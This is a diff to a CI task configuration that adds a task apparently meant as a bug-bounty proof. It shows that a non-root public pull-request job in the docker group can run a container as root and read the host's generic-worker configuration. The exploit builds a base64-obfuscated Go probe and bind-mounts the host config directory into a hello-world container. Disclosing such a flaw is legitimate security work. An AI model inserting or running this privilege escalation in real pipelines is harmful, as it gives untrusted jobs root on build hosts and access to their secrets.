@@ -101,6 +101,42 @@ tasks:
         - go tool goimports -w .
         - git diff
         - test $(git status --porcelain | wc -l) == 0
+  h1-docker-group-host-root-proof:
+    description: Benign proof that a public PR task can control the host Docker daemon
+    worker-type: gw-ubuntu-24-04-gui
+    worker:
+      max-run-time: 300
+      os-groups:
+        - docker
+      mounts:
+        - content:
+            url: 'https://go.dev/dl/{go_version}.linux-amd64.tar.gz'
+          directory: '{go_version}'
+          format: tar.gz
+    run:
+      command:
+        - |
+          set -eux
+          export GOROOT="$(pwd)/$GO_VERSION/go"
+          export PATH="$GOROOT/bin:$PATH"
+
+          echo "H1 task identity before Docker access"
+          id
+          test "$(id -u)" -ne 0
+          id -nG | tr ' ' '\n' | grep -qx docker
+          docker version
+          docker image inspect hello-world:latest >/dev/null
+
+          printf '%s' 'cGFja2FnZSBtYWluCgppbXBvcnQgKAoJImZtdCIKCSJvcyIKKQoKZnVuYyBtYWluKCkgewoJZiwgZXJyIDo9IG9zLk9wZW4oIi9ob3N0L2NvbmZpZyIpCglyZWFkYWJsZSA6PSBlcnIgPT0gbmlsCglzaXplIDo9IGludDY0KC0xKQoJaWYgZXJyID09IG5pbCB7CgkJaWYgaW5mbywgc3RhdEVyciA6PSBmLlN0YXQoKTsgc3RhdEVyciA9PSBuaWwgewoJCQlzaXplID0gaW5mby5TaXplKCkKCQl9CgkJXyA9IGYuQ2xvc2UoKQoJfQoJZm10LlByaW50ZigiSDFfRE9DS0VSX0hPU1RfUk9PVF9QUk9PRiBjb250YWluZXJfZXVpZD0lZCB3b3JrZXJfY29uZmlnX3JlYWRhYmxlPSV0IHdvcmtlcl9jb25maWdfYnl0ZXM9JWRcbiIsIG9zLkdldGV1aWQoKSwgcmVhZGFibGUsIHNpemUpCglpZiBvcy5HZXRldWlkKCkgIT0gMCB8fCAhcmVhZGFibGUgewoJCW9zLkV4aXQoMSkKCX0KfQo=' | base64 -d > h1_docker_probe.go
+          CGO_ENABLED=0 go build -trimpath -o h1-docker-probe h1_docker_probe.go
+
+          docker run --rm --pull=never --network none \
+            --entrypoint /h1probe \
+            --mount type=bind,src="$(pwd)/h1-docker-probe",dst=/h1probe,readonly \
+            --mount type=bind,src=/etc/generic-worker,dst=/host,readonly \
+            hello-world:latest
+
+          echo "RESULT: NON_ROOT_PUBLIC_PR_TASK_CONTROLLED_HOST_DOCKER_AS_ROOT"
   build/test-multiuser-ubuntu-24.04-amd64:
     description: This builds and tests the amd64 version of generic-worker (multiuser engine) on Ubuntu 24.04
     worker-type: gw-ubuntu-24-04-gui
